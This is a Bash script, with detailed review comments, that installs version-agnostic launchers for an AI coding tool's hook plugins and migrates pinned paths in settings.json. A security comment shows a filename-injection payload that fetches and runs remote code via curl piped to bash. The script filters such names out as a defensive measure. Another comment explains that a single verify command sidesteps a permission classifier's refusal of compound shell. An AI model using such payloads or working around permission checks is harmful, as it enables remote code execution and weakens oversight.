#!/usr/bin/env bash
set -euo pipefail
# v0.34.122 (#2536): install version-agnostic hook launchers, and migrate any
# version-pinned hook registrations in settings.json onto them.
#
# THE BUG: register-hook.sh and hooks/install-hooks.sh both baked an ABSOLUTE,
# version-pinned path into the operator's global settings.json. A cache bump
# plus GC of the old version dir left every registration 404'ing — and, before
# the GC, silently executing a stale build. Observed live 2026-08-22: 58 refs
# pinned to 0.34.108 while the repo was 0.34.121, which is what made the phase-1
# guard run a copy predating its own escape hatches (#2531).
#
# THE FIX: settings.json points at a stable launcher dir OUTSIDE the versioned
# cache. Each launcher re-resolves the newest cache version containing its own
# hook AT RUN TIME (see _lib/plugin-cache-resolve.sh). Nothing is pinned, so
# nothing can dangle, and a `/reload` propagates everywhere with no migration.
#
# Usage:
#   install-hook-launchers.sh [--generate] [--migrate] [--check] [--dry-run]
#     --generate  (default) write/refresh a launcher per auto-register hook
#     --migrate   rewrite version-pinned settings.json refs onto the launchers
#     --check     report drift only; rc 1 if anything would change
#     --dry-run   print the plan, change nothing
#
# Exit codes: 0 ok · 1 drift found (--check) · 2 usage/precondition · 3 write failure

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
# shellcheck source=../_lib/plugin-cache-resolve.sh
. "$SCRIPT_DIR/../_lib/plugin-cache-resolve.sh"
# shellcheck source=../_lib/event-frontmatter.sh
. "$SCRIPT_DIR/../_lib/event-frontmatter.sh"

HOOKS_DIR="$SCRIPT_DIR/../hooks"
SETTINGS="${CLAUDE_SETTINGS_FILE:-$HOME/.claude/settings.json}"
LAUNCHER_DIR=$(pcr_launcher_dir)

DO_GENERATE=1 DO_MIGRATE=0 CHECK_ONLY=0 DRY_RUN=0 DO_VERIFY=0
# Track EXPLICIT --generate separately from the default so `--verify --generate`
# and `--generate --verify` are rejected identically. Order-dependence here meant
# one order silently ran verify against launchers it had just rewritten, and the
# other verified a stale set (CR-in-CI #2540 phase2).
SAW_GENERATE=0
while [ $# -gt 0 ]; do
	case "$1" in
	--generate)
		DO_GENERATE=1
		SAW_GENERATE=1
		;;
	--migrate) DO_MIGRATE=1 ;;
	--verify)
		DO_VERIFY=1
		DO_GENERATE=0
		;;
	--check)
		CHECK_ONLY=1
		DO_MIGRATE=1
		;;
	--dry-run) DRY_RUN=1 ;;
	-h | --help)
		sed -n '4,26p' "$0"
		exit 0
		;;
	*)
		echo "install-hook-launchers: unknown arg: $1" >&2
		exit 2
		;;
	esac
	shift
done

# Reject --verify combined with an EXPLICIT --generate, in either order. --verify
# is a read-only health check; letting it run after a generate means it inspects
# launchers the same invocation just rewrote (self-confirming), and the reverse
# order verified a stale set. Order-independent because SAW_GENERATE records the
# explicit flag rather than the default (CR-in-CI #2540 phase2).
if [ "$DO_VERIFY" -eq 1 ] && [ "$SAW_GENERATE" -eq 1 ]; then
	echo "install-hook-launchers: --verify cannot be combined with --generate (verify is read-only; run them as separate invocations)" >&2
	exit 2
fi

command -v jq >/dev/null 2>&1 || {
	echo "install-hook-launchers: jq required but not found" >&2
	exit 2
}

_log() { echo "[install-hook-launchers] $*" >&2; }

# ---- 0. verify ------------------------------------------------------------
# Post-migration state check, as ONE command. Exists so verifying never requires
# an ad-hoc `python3 -c '…read settings.json…' && stat && ls && jq` pipeline:
# compound shell that reads the operator's global config is exactly what a
# permission classifier refuses, and re-deriving the checks by hand each time is
# how a check silently drifts from what it claims to test.
# rc 0 = healthy · rc 1 = a problem worth acting on.
if [ "$DO_VERIFY" -eq 1 ]; then
	vrc=0
	if [ ! -f "$SETTINGS" ]; then
		_log "NOTE: $SETTINGS not found — nothing to verify"
		exit 0
	fi
	if ! jq empty "$SETTINGS" 2>/dev/null; then
		_log "✗ $SETTINGS is not valid JSON"
		exit 1
	fi
	_log "✓ settings.json is valid JSON"

	# Count via the SAME jq walk --migrate uses, not a grep. The first version
	# used `grep -coE 'claude-workflow-core/<semver>/hooks/'`, which diverged from
	# migrate two ways: a SINGLE `claude-workflow-core` segment where migrate
	# requires the DOUBLED one (so verify could flag refs migrate would never
	# touch, prescribing a remedy guaranteed to no-op), and `grep -c` counts
	# matching LINES — `-o` is inert beside it — so a compact settings.json
	# reported 1 for 58 refs. One predicate, one count.
	pinned=$(jq -r '
	  [.. | strings
	   | select(test("claude-workflow-core/claude-workflow-core/[0-9]+\\.[0-9]+\\.[0-9]+/hooks/"))]
	  | unique | length
	' "$SETTINGS" 2>/dev/null) || pinned=""
	case "$pinned" in '' | *[!0-9]*)
		_log "✗ could not enumerate pinned refs in $SETTINGS — refusing to report health (fail-closed)"
		exit 1
		;;
	esac
	if [ "$pinned" -gt 0 ]; then
		_log "✗ $pinned version-pinned hook ref(s) remain — run --generate --migrate"
		vrc=1
	else
		_log "✓ 0 version-pinned hook refs"
	fi

	# Every launcher reference must resolve to something executable. A ref
	# pointing at a missing file is the exact failure this change exists to
	# prevent, so it is checked explicitly rather than inferred.
	total=0
	bad=0
	while IFS= read -r p; do
		[ -n "$p" ] || continue
		total=$((total + 1))
		[ -x "$p" ] || {
			_log "✗ launcher ref not executable: $p"
			bad=$((bad + 1))
		}
	done < <(jq -r --arg d "$LAUNCHER_DIR" \
		'[.. | strings | select(startswith($d + "/"))] | unique | .[]' "$SETTINGS" 2>/dev/null)
	if [ "$bad" -gt 0 ]; then
		_log "✗ $bad of $total launcher ref(s) unresolvable"
		vrc=1
	elif [ "$total" -eq 0 ]; then
		# "0 refs, all executable" is vacuously true and reads as a pass. A
		# machine running this plugin is expected to have launcher refs, so an
		# empty set means never-migrated, a wiped settings.json, or a jq failure
		# swallowed above — every one of which is a problem, not health.
		_log "✗ no launcher refs in $SETTINGS at all — hooks are not registered through launchers (run --generate --migrate)"
		vrc=1
	else
		_log "✓ $total launcher ref(s), all executable"
	fi

	# End-to-end: prove a launcher actually forwards to a real hook, and report
	# which cache version it lands on. A path existing is not the same as it
	# working, and that version is the number that had hooks running a stale
	# build for a whole session.
	# ASSERT ON RESOLUTION, NOT ON EXIT STATUS (#2536 r1 — critical).
	#
	# The first version piped a payload through the launcher and treated rc 0 as
	# "✓ end-to-end: launcher executed a real hook payload". rc 0 is shared by
	# THREE different outcomes, so it proved nothing:
	#   - the hook ran and allowed          (healthy)
	#   - the launcher FAILED OPEN because no cache version had the hook
	#     (the precise failure this command exists to detect — and its warning
	#      went to the stderr the check discarded with 2>&1)
	#   - and a correct hook_deny exits 2, which was reported as "✗ failed"
	# So it passed on an empty/GC'd cache and failed on correct deny behaviour.
	#
	# Now: capture the launcher's stderr and fail on its own fail-open sentinel,
	# ignoring the hook's verdict entirely (forwarding is the launcher's job; the
	# hook's allow/deny is not verify's business). And give the resolver check a
	# real else — its rc was previously dropped on the floor.
	probe_name="phase1-directive-pending-guard.sh"
	probe="$LAUNCHER_DIR/$probe_name"
	if [ ! -x "$probe" ]; then
		_log "✗ probe launcher missing: $probe (launchers not generated?)"
		vrc=1
	else
		probe_rc=0
		probe_err=$(printf '{"tool_name":"Bash","tool_input":{"command":"git diff"}}' |
			"$probe" 2>&1 >/dev/null) || probe_rc=$?
		if printf '%s' "$probe_err" | grep -qF 'no plugin-cache version'; then
			_log "✗ end-to-end: launcher FAILED OPEN — no cache version ships hooks/$probe_name"
			_log "  every hook is currently a silent no-op; the gating layer is off"
			vrc=1
		elif [ "$probe_rc" -eq 126 ] || [ "$probe_rc" -eq 127 ]; then
			# The LAUNCHER itself couldn't exec (non-executable target, missing
			# interpreter, or its own shell aborted) — distinct from the hook
			# running and returning its own verdict. 126/127 is a launcher
			# failure, not health (CR-in-CI #2540). The hook's own deny (exit 2)
			# is legitimate and deliberately ignored.
			_log "✗ end-to-end: launcher could not execute (rc=$probe_rc) — $probe"
			vrc=1
		else
			_log "✓ end-to-end: launcher forwarded to a real hook (no fail-open)"
		fi
		if _best=$(pcr_newest_complete "$(pcr_cache_root)" "hooks/$probe_name"); then
			_log "✓ resolves to ${_best##*/}"
		else
			_log "✗ no cache version under $(pcr_cache_root) provides an executable hooks/$probe_name"
			vrc=1
		fi
	fi
	exit "$vrc"
fi

# ---- 1. generate launchers ------------------------------------------------
# One launcher per auto-register hook. Idempotent: a launcher whose content is
# already byte-correct is left alone, so re-running is a no-op and mtimes stay
# meaningful.
drift=0
if [ "$DO_GENERATE" -eq 1 ]; then
	if [ "$DRY_RUN" -eq 0 ] && [ "$CHECK_ONLY" -eq 0 ]; then
		mkdir -p "$LAUNCHER_DIR" || {
			echo "install-hook-launchers: cannot create $LAUNCHER_DIR" >&2
			exit 3
		}
	fi
	shopt -s nullglob
	for hook in "$HOOKS_DIR"/*.sh; do
		base=${hook##*/}
		# SECURITY (#2536 r1 security-review): the basename is substituted into a
		# script that is then chmod 755'd and exec'd on EVERY hook invocation, so
		# it is an injection sink. `"`, `$`, `(`, `;` and newline are all legal in
		# POSIX filenames, and @@HOOK@@ lands inside double quotes at three sites
		# — a file named `x";$(curl -s evil|bash);".sh` would put the command
		# INSIDE the generated launcher body. This repo is the SSOT bootstrapped
		# into consumer repos, so a filename is supply-chain-reachable (a PR
		# adding a file, or a tampered cache dir this loop later globs). Restrict
		# to a conservative charset BEFORE the basename reaches pcr_launcher_body.
		# Loud, not silent: a skipped hook gets no launcher, which --verify would
		# otherwise report only as a missing ref.
		if ! [[ $base =~ ^[A-Za-z0-9._-]+\.sh$ ]]; then
			_log "WARN: skipping unsafe hook filename (refusing to generate a launcher): $base"
			continue
		fi
		# Helpers (`_*`) and installers (`install-*`) are never invoked as hooks.
		event_frontmatter_skip_basename "$base" && continue
		# EVERY remaining hook gets a launcher — deliberately NOT gated on
		# `auto-register: true`. That frontmatter answers a different question
		# ("should register-hook.sh --all-auto-register add this to
		# settings.json?", true for 10 of 87 hooks); launcher generation has to
		# answer "is this hook ever EXECUTED from settings.json?", which is any
		# of them. Gating on auto-register produced launchers for 10 hooks while
		# the operator's settings.json referenced 58, so 48 refs stayed
		# version-pinned and still 404'd after a cache GC — the exact failure
		# this script exists to end. Generating a launcher for a hook nothing
		# references is free: it is an unused forwarder in a dir we own.
		want=$(pcr_launcher_body "$base")
		target="$LAUNCHER_DIR/$base"
		if [ -f "$target" ] && [ "$(cat "$target")" = "$want" ] && [ -x "$target" ]; then
			continue
		fi
		drift=1
		if [ "$CHECK_ONLY" -eq 1 ] || [ "$DRY_RUN" -eq 1 ]; then
			_log "would write launcher: $target"
			continue
		fi
		# Atomic: write to a mktemp sibling then mv, so a concurrent hook
		# invocation never reads a half-written launcher.
		tmp=$(mktemp "$LAUNCHER_DIR/.${base}.XXXXXX") || {
			echo "install-hook-launchers: mktemp failed in $LAUNCHER_DIR" >&2
			exit 3
		}
		printf '%s\n' "$want" >"$tmp" || {
			rm -f "$tmp"
			echo "install-hook-launchers: write failed for $target" >&2
			exit 3
		}
		chmod 755 "$tmp" || {
			rm -f "$tmp"
			echo "install-hook-launchers: chmod failed for $target" >&2
			exit 3
		}
		mv -f "$tmp" "$target" || {
			rm -f "$tmp"
			echo "install-hook-launchers: mv failed for $target" >&2
			exit 3
		}
		_log "installed launcher: $base"
	done
	shopt -u nullglob
fi

# ---- 2. migrate settings.json --------------------------------------------
[ "$DO_MIGRATE" -eq 1 ] || {
	[ "$drift" -eq 1 ] && [ "$CHECK_ONLY" -eq 1 ] && exit 1
	exit 0
}

[ -f "$SETTINGS" ] || {
	_log "NOTE: $SETTINGS not found — nothing to migrate"
	exit 0
}
jq empty "$SETTINGS" 2>/dev/null || {
	echo "install-hook-launchers: $SETTINGS is not valid JSON — refusing to touch it" >&2
	exit 3
}

# Enumerate EVERY referenced version, not just the newest. A settings.json that
# accumulated refs across upgrades is mixed-version, and healing only the max
# while reporting success was defect #2 of the reverted first attempt.
pinned_json=$(jq -r '
  [.. | strings
   | select(test("claude-workflow-core/claude-workflow-core/[0-9]+\\.[0-9]+\\.[0-9]+/hooks/"))]
  | unique
' "$SETTINGS" 2>/dev/null) || {
	echo "install-hook-launchers: jq failed enumerating pinned refs — refusing to migrate (fail-closed)" >&2
	exit 3
}
pinned_count=$(printf '%s' "$pinned_json" | jq -r 'length' 2>/dev/null) || pinned_count=""
# FAIL CLOSED on an unusable count. The reverted attempt ran its verification
# inside a heredoc command substitution, so a jq error produced empty output,
# the verify loop body never ran, and it "verified" zero paths and healed
# anyway. An unreadable enumeration must abort, never proceed.
case "$pinned_count" in '' | *[!0-9]*)
	echo "install-hook-launchers: could not count pinned refs — refusing to migrate (fail-closed)" >&2
	exit 3
	;;
esac
if [ "$pinned_count" -eq 0 ]; then
	_log "no version-pinned hook refs in $SETTINGS — already launcher-based or never registered"
	[ "$drift" -eq 1 ] && [ "$CHECK_ONLY" -eq 1 ] && exit 1
	exit 0
fi

# Report per-version so a mixed-version settings.json is visible, not averaged.
_log "found $pinned_count version-pinned hook ref(s) across version(s):"
printf '%s' "$pinned_json" |
	jq -r '.[] | capture("claude-workflow-core/claude-workflow-core/(?<v>[0-9]+\\.[0-9]+\\.[0-9]+)/").v' |
	sort | uniq -c | while read -r n v; do _log "    v$v — $n ref(s)"; done

# SSOT for splitting a hook command string into its PROGRAM token / arg tail /
# basename — the SAME jq def block register-hook.sh uses, sourced from the lib so
# the three sites can never disagree (CR-in-CI #2540). Falls back to an inline
# copy only if the lib failed to source, keeping migrate functional lib-less.
if declare -f pcr_progtoken_jq >/dev/null 2>&1; then
	PROGTOKEN_JQ=$(pcr_progtoken_jq)
else
	PROGTOKEN_JQ='
  def progpath: split(" ")[0];
  def _tail: (split("/hooks/") | (if length > 1 then (.[1:] | join("/hooks/")) else .[0] end));
  def progtoken: _tail | split(" ")[0];
  def progargs:  _tail | (split(" ")[1:] | join(" "));
  def progbasename: progtoken | (split("/") | .[-1]);
'
fi

# Only migrate a ref whose basename has a launcher we actually installed —
# otherwise the rewrite would point at a file that does not exist. This is the
# completeness guard, and it is enforced per-ref rather than per-version. The
# probe keys on `progtoken` — the SAME rule the rewrite uses (#2535 phase2: a
# command registered with arguments like ".../hooks/foo.sh --strict" must probe
# for "foo.sh", not "foo.sh --strict", or the ref stays pinned forever and
# --verify reports permanent unresolvable drift).
# Extract the program tokens up front WITH an rc check. A process-substitution
# `done < <(jq …)` discards jq's exit status, so a broken filter or unreadable
# input would yield an empty loop and migrate NOTHING while still reporting
# success — a silent fail-OPEN (CR-in-CI #2540). Capture, check, THEN iterate.
_progtokens=$(printf '%s' "$pinned_json" | jq -r "$PROGTOKEN_JQ"' .[] | progtoken') || {
	echo "install-hook-launchers: could not extract program tokens from pinned refs — refusing to migrate (fail-closed)" >&2
	exit 3
}
missing=0
have_list=""
while IFS= read -r b; do
	[ -n "$b" ] || continue
	# -x, NOT -f: --verify requires the launcher be executable and --generate
	# always chmod 755's it. A non-executable launcher would migrate cleanly here
	# and then fail to exec on every hook invocation — the same invariant the
	# resolver's -x probe enforces (CR-in-CI #2540). Leave such a ref pinned.
	if [ -x "$LAUNCHER_DIR/$b" ]; then
		have_list="$have_list$b"$'\n'
	else
		_log "WARN: no executable launcher for $b — leaving its ref pinned (rewriting it would dangle)"
		missing=$((missing + 1))
	fi
done <<EOF
$_progtokens
EOF
# The exact set the jq rewrite below is allowed to touch. Built from real `-x`
# probes so the gate ENFORCES what the warning above claims — before this, the
# walk rewrote every matching ref including the ones it had just warned it would
# leave alone, which would have pointed settings.json at a nonexistent file.
have_json=$(printf '%s' "$have_list" | jq -Rsc 'split("\n") | map(select(length > 0))') || {
	echo "install-hook-launchers: could not build the launcher allowlist — refusing to migrate (fail-closed)" >&2
	exit 3
}

# Count the refs that will ACTUALLY be rewritten by filtering pinned_json through
# the same membership gate the jq rewrite uses, instead of the `pinned_count -
# missing` arithmetic (CR-in-CI #2540). The subtraction assumed the two counters
# stay in lockstep; deriving the number from the real predicate means the
# reported figure cannot drift from what the rewrite does. Fail CLOSED.
# NB: bind the token with `as $t` BEFORE the index() call. Inside `$have |
# index(...)` the input `.` is the ARRAY, so applying `progtoken` there feeds it
# an array and jq dies "split input and separator must be strings" — the same
# reason the rewrite filter below binds `$b` first.
rewritable=$(printf '%s' "$pinned_json" | jq -r --argjson have "$have_json" "$PROGTOKEN_JQ"'
	[ .[] | (progtoken) as $t | select(($have | index($t)) != null) ] | length
') || {
	echo "install-hook-launchers: could not count rewritable refs — refusing to migrate (fail-closed)" >&2
	exit 3
}
case "$rewritable" in '' | *[!0-9]*)
	echo "install-hook-launchers: rewritable-ref count malformed — refusing to migrate (fail-closed)" >&2
	exit 3
	;;
esac

if [ "$CHECK_ONLY" -eq 1 ] || [ "$DRY_RUN" -eq 1 ]; then
	_log "would rewrite $rewritable ref(s) onto $LAUNCHER_DIR"
	# --check is a drift GATE: pinned refs remaining == drift == exit 1.
	# --dry-run is a PLAN preview: it changed nothing and found nothing wrong, so
	# it exits 0 regardless of how many refs it would rewrite. Conflating the two
	# made `--dry-run` return the drift code and read as a failure to any wrapper.
	if [ "$CHECK_ONLY" -eq 1 ] && [ "$rewritable" -gt 0 ]; then
		exit 1
	fi
	exit 0
fi

# Serialize against concurrent sessions. settings.json is a global mutable file
# that every session, install-hooks.sh, and migrate-settings.sh may rewrite; the
# reverted attempt had no lock at all, so two sessions starting together could
# lose one another's writes. mkdir is the portable atomic test-and-set (macOS
# has no flock(1)).
LOCK="$LAUNCHER_DIR/.settings-migrate.lock"
_lock_held=0
for _ in 1 2 3 4 5 6 7 8 9 10; do
	if mkdir "$LOCK" 2>/dev/null; then
		printf '%s\n' "$$" >"$LOCK/pid" 2>/dev/null || true
		_lock_held=1
		break
	fi
	# STALE-LOCK RECOVERY (#2536 phase2 CR): the EXIT trap does not run on
	# SIGKILL/OOM/power loss, so a dead run leaves the dir and wedges every
	# future migration. If the recorded owner PID is no longer alive, reclaim it.
	_owner=$(cat "$LOCK/pid" 2>/dev/null || echo "")
	if [ -n "$_owner" ] && ! kill -0 "$_owner" 2>/dev/null; then
		_log "reclaiming stale migration lock (owner PID $_owner is gone)"
		rm -rf "$LOCK" 2>/dev/null || true
		continue
	fi
	sleep 0.3
done
[ "$_lock_held" -eq 1 ] || {
	echo "install-hook-launchers: could not acquire $LOCK after ~3s — another migration (PID $(cat "$LOCK/pid" 2>/dev/null || echo '?')) is running; not touching $SETTINGS" >&2
	exit 3
}
# shellcheck disable=SC2064  # intentional: expand LOCK now, at trap-set time
trap "rm -rf '$LOCK' 2>/dev/null || true" EXIT

# Backup, without ever clobbering an existing one. A deterministic name plus an
# unconditional cp (the reverted attempt) overwrites the pristine backup with
# the already-mutated file on a second run — destroying the only rollback
# artifact exactly when it is needed. mktemp gives a fresh name every time.
bak=$(mktemp "${SETTINGS}.bak-launchers.XXXXXX") || {
	echo "install-hook-launchers: mktemp for backup failed — not touching $SETTINGS" >&2
	exit 3
}
cp "$SETTINGS" "$bak" || {
	echo "install-hook-launchers: backup copy to $bak failed — not touching $SETTINGS" >&2
	exit 3
}

# Capture jq's stderr so a rewrite failure can name its cause — "STEP=rewrite jq
# failed" alone cannot distinguish a malformed filter from unreadable input,
# which is the point of the STEP= tagging. mktemp failure is non-fatal here:
# fall back to /dev/null and lose only the diagnostic.
jq_err=$(mktemp -t ihl-jqerr.XXXXXX 2>/dev/null) || jq_err=/dev/null
tmp=$(mktemp "$(dirname "$SETTINGS")/.settings.XXXXXX") || {
	echo "install-hook-launchers: mktemp for rewrite failed (backup at $bak) — $SETTINGS unchanged" >&2
	exit 3
}
# Named per-step failures below: the reverted attempt wrapped every step in
# `2>/dev/null` and emitted one message that could not say which step failed,
# and asserted "settings left untouched" without knowing whether mv had run.
# SCOPED TO .hooks, and replaces only the PATH PREFIX (#2536 r1 security).
# The first version ran `walk()` over the WHOLE document and replaced the
# ENTIRE matched string with "<dir>/<basename>". Two consequences: a
# command carrying arguments (".../hooks/foo.sh --strict") silently lost
# them, and a pinned path embedded in another subtree — a
# permissions.allow rule like `Bash(/…/hooks/foo.sh:*)` — was rewritten
# into a bare path, destroying the rule's syntax. Neither is recoverable
# except from the backup, and both fail silently. (Checked against this
# machine's pre-migration backup: 0 arg-bearing commands and 0 pinned
# paths outside .hooks, so nothing was lost here — but it is luck, not
# design.) Hook commands live under .hooks; nothing else may be touched.
if ! jq --arg dir "$LAUNCHER_DIR" --argjson have "$have_json" "$PROGTOKEN_JQ"'
  def relaunch:
    if type == "string" and test("claude-workflow-core/claude-workflow-core/[0-9]+\\.[0-9]+\\.[0-9]+/hooks/")
    then # program token only, then re-append any arguments verbatim — via the
         # SAME progtoken/progargs SSOT the completeness probe used above.
         (progtoken) as $b
       | (progargs) as $rest
         # Rewrite ONLY when a launcher for this basename actually exists.
         # Without this membership gate the walk relaunched every matching ref,
         # including ones the completeness check had just warned it would leave
         # pinned — the warning was true prose over a false action. Caught by
         # dogfooding: review-log.sh has no launcher (not auto-register) yet was
         # still rewritten, which would have pointed settings.json at a file that
         # does not exist. Leaving it pinned is strictly safer than dangling it.
         | (if ($have | index($b))
            then ($dir + "/" + $b + (if $rest == "" then "" else " " + $rest end))
            else . end)
    else . end;
  # Scoped to .hooks[][].hooks[].command — NOT walk() over the whole document.
  # Anything outside .hooks (permissions rules, statusLine, MCP args) is left
  # byte-identical.
  if has("hooks") then
    .hooks |= with_entries(
      .value |= map(
        if type == "object" and has("hooks")
        then .hooks |= map(if type == "object" and has("command")
                           then .command |= relaunch else . end)
        else . end))
  else . end
' "$SETTINGS" >"$tmp" 2>"$jq_err"; then
	_jqmsg=$(head -c 200 "$jq_err" 2>/dev/null || echo "")
	# NOT `rm -f "$tmp" "$jq_err"`: jq_err falls back to /dev/null when mktemp
	# fails (line ~411), and `rm -f /dev/null` would delete the device node
	# (CR-in-CI #2540). Remove the real tempfile unconditionally; the diagnostic
	# only when it is a real file.
	rm -f "$tmp"
	[ "$jq_err" = /dev/null ] || rm -f "$jq_err"
	# Include jq's own diagnostic: "STEP=rewrite jq failed" alone cannot tell a
	# malformed filter from an unreadable input, which is the whole point of the
	# STEP= tagging.
	echo "install-hook-launchers: STEP=rewrite jq failed${_jqmsg:+ ($_jqmsg)} — $SETTINGS unchanged, backup at $bak" >&2
	exit 3
fi
# jq_err is only the rewrite step's diagnostic; the rewrite has now succeeded, so
# remove it here rather than leaking it on the success / revalidate / mv paths.
[ "$jq_err" = /dev/null ] || rm -f "$jq_err"
if ! jq empty "$tmp" 2>/dev/null; then
	rm -f "$tmp"
	echo "install-hook-launchers: STEP=revalidate produced invalid JSON — $SETTINGS unchanged, backup at $bak" >&2
	exit 3
fi
# Preserve mode/owner. `mv` replaces the inode, so a temp created at the ambient
# umask silently changes settings.json's permissions — this file has already
# drifted that way once (its .bak siblings are 600 while it is 644).
if ! chmod --reference="$SETTINGS" "$tmp" 2>/dev/null; then
	_mode=$(stat -f '%Lp' "$SETTINGS" 2>/dev/null || stat -c '%a' "$SETTINGS" 2>/dev/null || echo "")
	if [ -n "$_mode" ]; then
		chmod "$_mode" "$tmp" 2>/dev/null ||
			_log "WARN: STEP=preserve-mode could not apply mode $_mode — continuing"
	else
		_log "WARN: STEP=preserve-mode could not read original mode — continuing"
	fi
fi
if ! mv -f "$tmp" "$SETTINGS"; then
	rm -f "$tmp"
	echo "install-hook-launchers: STEP=replace mv failed — $SETTINGS unchanged, backup at $bak" >&2
	exit 3
fi

_log "✓ migrated $rewritable hook ref(s) to $LAUNCHER_DIR (backup: $bak)"
_log "  these are now version-agnostic — a cache bump + GC can no longer dangle them"
exit 0
